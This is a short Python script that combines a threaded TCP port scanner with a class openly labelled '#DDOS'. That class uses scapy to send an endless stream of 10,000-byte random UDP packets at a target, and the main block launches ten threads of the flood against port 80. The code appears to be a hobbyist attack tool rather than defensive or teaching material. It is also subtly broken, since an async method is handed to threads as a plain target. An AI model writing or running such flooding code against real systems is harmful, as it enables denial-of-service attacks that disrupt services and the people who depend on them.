import socket
from tqdm import tqdm
import threading, os 
from scapy.all import *
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed

class PortScanner:
    """
    Class for scanning ports from an x port to y port
    """

    def __init__(self, target_ip: str, start: int, end: int) -> None:
        """
        Initialization of the Parameters for PortScanner

        Parameters:
        - target_ip (str): Target IP address
        - start (int): Starting port.
        - end (int): Ending port.
        """
        self.target_ip = target_ip
        self.start = start
        self.end = end

    def scan_port(self, port) -> int:
        """
        Scan a specific port on the given IP address

        Parameters:
        - port (int): Port to be scanned.

        Returns:
        - int: Port number if it is opened, 0 if it is closed.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        try:
            result = sock.connect_ex((self.target_ip, port))
            return port if result == 0 else 0
        finally:
            sock.close()

    def scan_range(self) -> list[int]:
        """
        Scan the given range of ports and put them into an array if they're opened

        Returns:
        - list[int]: Open ports array.
        """
        open_ports: list[int] = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            # Create futures for the scan_port function in parallel
            futures = [executor.submit(self.scan_port, port) for port in range(self.start, self.end + 1)]

            # Monitor the progress using tqdm and process the results
            for future in tqdm(as_completed(futures), total=len(futures), desc="Scanning Ports"):
                result = future.result()
                if result != 0:
                    open_ports.append(result)

        return open_ports

    def get_service_name(self, port) -> str:
        """
        Get the common service name associated with a given port.

        Parameters:
        - port (int): Port number.

        Returns:
        - str: Common service name.
        """
        try:
            service_name = socket.getservbyport(port)
            return service_name
        except (socket.error, OSError):
            return "Unknown Service"


#DDOS
class PortOverload:
    def __init__(self, target_ip: str, port: int):
        self.target_ip = target_ip
        self.port = port
    #Send bytearrays rapidly to an X ip and Y port
    async def attack(self):
        attack_num = 0
        while True:
            try:
                #Using UDP method
                packet = IP(dst=self.target_ip)/UDP(dport=self.port)/Raw(load=os.urandom(10000))
                send(packet, verbose=True)
                attack_num += 1
            except Exception as e:
                print('Error:', e)
                


if __name__ == "__main__":
    target_ip = ''
    port_scanner = PortScanner(target_ip, 1, 2)
    open_ports = port_scanner.scan_range()
    print(f"Open Ports: {open_ports}")

    ddos_target = PortOverload(target_ip, 80)
    for _ in range(10):
        thread = threading.Thread(target=ddos_target.attack)
        thread.start()


